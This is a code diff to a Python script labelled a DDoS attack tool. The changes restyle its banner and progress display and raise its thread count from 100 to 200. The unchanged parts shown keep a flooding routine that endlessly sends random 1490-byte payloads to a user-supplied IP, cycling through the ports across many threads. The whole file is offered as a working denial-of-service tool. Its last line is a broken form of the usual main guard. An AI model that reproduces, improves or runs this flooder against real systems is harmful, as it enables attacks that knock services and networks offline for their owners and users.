@@ -3,34 +3,38 @@ import time
 import socket
 import random
 import threading
+from datetime import datetime
 
 # Colors
-BLUE = '\033[94m'
 GREEN = '\033[92m'
+CYAN = '\033[96m'
 RED = '\033[91m'
 YELLOW = '\033[93m'
 RESET = '\033[0m'
 
-# Banner display
+# Display Banner
 def print_banner():
     os.system("clear")
-    print(f"{YELLOW}#################################################{RESET}")
-    print(f"{RED}      DDoS ATTACK TOOL BY mhmd-error            {RESET}")
-    print(f"{YELLOW}#################################################{RESET}")
-    print(f"{GREEN}GitHub: https://github.com/mhmd138az{RESET}")
-    print(f"{BLUE}==============================================={RESET}")
+    os.system("figlet DDos Attack")
+    print(f"{CYAN}Author: mhmd-error{RESET}")
+    print(f"{CYAN}GitHub: https://github.com/mhmd138az{RESET}")
+    print(f"{YELLOW}==============================={RESET}")
     print()
 
-# Progress bar
-def progress_bar():
-    print(f"{BLUE}Preparing attack...{RESET}")
-    for i in range(101):
-        time.sleep(0.05)
-        os.system("clear")
-        print(f"{GREEN}[{'='*int(i/5)}{' '*(20-int(i/5))}] {i}%{RESET}")
-    print(f"{GREEN}Attack is now live!{RESET}")
+# Show progress bar
+def show_progress():
+    print(f"{CYAN}[====================] 0%{RESET}")
+    time.sleep(1)
+    print(f"{CYAN}[=====               ] 25%{RESET}")
+    time.sleep(1)
+    print(f"{CYAN}[==========          ] 50%{RESET}")
+    time.sleep(1)
+    print(f"{CYAN}[===============     ] 75%{RESET}")
+    time.sleep(1)
+    print(f"{CYAN}[====================] 100%{RESET}")
+    time.sleep(2)
 
-# Function to send packets
+# Send packets function
 def send_packets(ip, port, sock, bytes):
     sent = 0
     while True:
@@ -40,8 +44,8 @@ def send_packets(ip, port, sock, bytes):
         if port > 65535:
             port = 1
         os.system("clear")
-        print(f"{RED}Attack in Progress...{RESET}")
-        print(f"{YELLOW}Sending packet {sent} to {ip} through port {port}{RESET}")
+        print(f"{RED}DDoS Attack in Progress...{RESET}")
+        print(f"{YELLOW}Sent {sent} packets to {ip} through port {port}{RESET}")
         time.sleep(0.1)
 
 # Start the attack
@@ -50,13 +54,13 @@ def start_attack(ip, port):
     bytes = random._urandom(1490)
     threads = []
 
+    # Start banner and progress bar
     print_banner()
-    progress_bar()
+    show_progress()
     
-    print(f"{RED}Launching attack...{RESET}")
-
-    # Create multiple threads for stronger attack
-    for _ in range(100):
+    # Start threads for attack
+    print(f"{RED}Attack Starting...{RESET}")
+    for _ in range(200):  # Using 200 threads
         thread = threading.Thread(target=send_packets, args=(ip, port, sock, bytes))
         thread.start()
         threads.append(thread)
@@ -64,10 +68,10 @@ def start_attack(ip, port):
     for thread in threads:
         thread.join()
 
-# Main function to run the attack
+# Main function
 def main():
-    ip = input(f"{GREEN}Enter Target IP: {RESET}")
-    port = int(input(f"{GREEN}Enter Target Port: {RESET}"))
+    ip = input(f"{GREEN}Enter Target IP: {RESET}")  # For Python 3
+    port = int(input(f"{GREEN}Enter Target Port: {RESET}"))  # For Python 3
     start_attack(ip, port)
 
 if name == "main":
